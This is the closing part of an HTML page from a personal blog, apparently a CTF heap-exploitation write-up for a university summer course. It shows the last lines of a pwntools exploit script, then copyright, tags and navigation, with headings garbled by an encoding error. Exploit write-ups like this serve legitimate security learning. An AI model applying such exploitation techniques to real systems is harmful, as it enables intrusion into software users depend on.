class="string">&quot;name:&quot;</span>)</span><br><span class="line">r.send(<span class="built_in">str</span>(<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="æœ€åä¸€æ®µç”¨äºæŸ¥æ‰¾mdæºæ–‡ä»¶ä»¥ä¾¿ä¿®æ”¹"><a href="#æœ€åä¸€æ®µç”¨äºæŸ¥æ‰¾mdæºæ–‡ä»¶ä»¥ä¾¿ä¿®æ”¹" class="headerlink" title="æœ€åä¸€æ®µç”¨äºæŸ¥æ‰¾mdæºæ–‡ä»¶ä»¥ä¾¿ä¿®æ”¹"></a>æœ€åä¸€æ®µç”¨äºæŸ¥æ‰¾mdæºæ–‡ä»¶ä»¥ä¾¿ä¿®æ”¹</h2><blockquote>
<p>//æ–‡æ¡£æŸ¥æ‰¾ï¼šå¤æ—¦ç™½æ³½æš‘æœŸè¯¾ç¨‹-heap-é¢˜-ç¬¬ä¸€é¢˜.md</p>
</blockquote>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>HaveYouTall</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="https://haveyoutall.github.io/2021/08/11/%E5%A4%8D%E6%97%A6%E7%99%BD%E6%B3%BD%E6%9A%91%E6%9C%9F%E8%AF%BE%E7%A8%8B-heap-%E9%A2%98-%E7%AC%AC%E4%B8%80%E9%A2%98/">https://haveyoutall.github.io/2021/08/11/%E5%A4%8D%E6%97%A6%E7%99%BD%E6%B3%BD%E6%9A%91%E6%9C%9F%E8%AF%BE%E7%A8%8B-heap-%E9%A2%98-%E7%AC%AC%E4%B8%80%E9%A2%98/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>If you read this, then you must have read this already. lol~~~</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/ctf-pwn/"># ctf-pwn</a>
                    
                        <a href="/tags/heap/"># heap</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>Â· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2021/08/11/ubuntu16-ruby/">ubuntu16-ruby-å®‰è£…é—®é¢˜</a>
            
            
            <a class="next" rel="next" href="/2021/07/30/hello-world/">hexoåšå®¢æ­å»ºé—®é¢˜è®°å½•</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>Â© HaveYouTall | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>